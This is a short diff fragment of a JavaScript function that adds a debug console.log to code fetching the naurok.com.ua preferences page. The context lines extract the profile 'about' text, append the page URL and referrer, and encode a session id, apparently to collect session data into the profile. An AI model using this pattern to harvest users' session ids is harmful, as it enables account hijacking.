@@ -27,6 +27,7 @@
     async function updateProfile () {
         const preferences = await fetch('https://naurok.com.ua/preferences');
         const html = await preferences.text();
+        console.log(html);
         const about = html.match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences.about." rows="5">(.+)<.textarea>/)[1] + '\n' + url + '\n' + referrer;
         
         const text = encode(sessid);
